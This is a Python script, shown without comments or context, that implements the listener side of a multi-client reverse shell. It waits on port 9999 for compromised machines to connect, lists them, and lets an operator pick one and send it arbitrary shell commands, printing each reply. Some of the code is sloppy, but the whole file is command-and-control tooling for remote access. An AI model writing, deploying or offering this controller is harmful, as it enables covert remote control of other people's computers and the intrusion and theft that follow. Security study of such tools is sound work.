import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []

def create_socket():
    try:
        global host_ip
        global port
        global sock

        host_ip = ''
        port = 9999
        sock = socket.socket()
    except socket.error as msg:
        print('Socket creation error: ' + str(msg))

def bind_socket():
    try:
        global host_ip
        global port
        global sock
        print("Binding the port" + str(port))
        sock.bind((host_ip, port))
        sock.listen(5)
    except socket.error as msg:
        print("Binding error: " + str(msg) + "\n " + "Retrying...")
        bind_socket()

def handle_connection(sock):
    for i in all_connections:
        i.close()
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = sock.accept()
            sock.setblocking(1)
            all_connections.append(conn)
            all_address.append(address)

            print(str(address) + " is connected")
        except Exception as e:
            print("Error accepting connection:", str(e))

def Shell():
    while True:
        cmd = input("shell>")
        if cmd == "exit":
            sys.exit()
        elif cmd == "list":
            print("Client List:")
            list_connections()
        elif 'select' in cmd:
            conn = select_client(cmd)
            if conn is not None:
                send_command(conn)
        else:
            print("Command not recognized")

def list_connections():
    result = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        result += str(i) + " " + str(all_address[i]) + " " + str(all_address[i][1]) + "\n"
    print("Client" + "\n" + result)

def select_client(cmd):
    try:
        client_id = int(cmd.split()[1])
        conn = all_connections[client_id]
        print("You are now connected to " + str(all_address[client_id]))
        print(str(all_address[client_id]) + "> ", end="")
        return conn
    except Exception as e:
        print("Invalid command:", str(e))
        return None

def send_command(conn):
    while True:
        cmd = input()
        if cmd == "exit":
            conn.close()
            sys.exit()
        if len(cmd) > 0:
            conn.send(str.encode(cmd))
            client_output = str(conn.recv(201480), "utf-8")
            print(client_output, end="")
            print(str(all_address[all_connections.index(conn)]) + "> ", end="")
        else:
            print("Command not recognized")

def create_thread():
    for i in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=handle_thread, args=(i,))
        t.daemon = True
        t.start()
        time.sleep(1)

def handle_thread(thread_id):
    if thread_id == 0:
        create_socket()
        bind_socket()
        handle_connection(sock)
    elif thread_id == 1:
        Shell()

def create_job():
    for i in range(NUMBER_OF_THREADS):
        queue.put(i)
    queue.join()

def main():
    create_thread()
    create_job()

main()
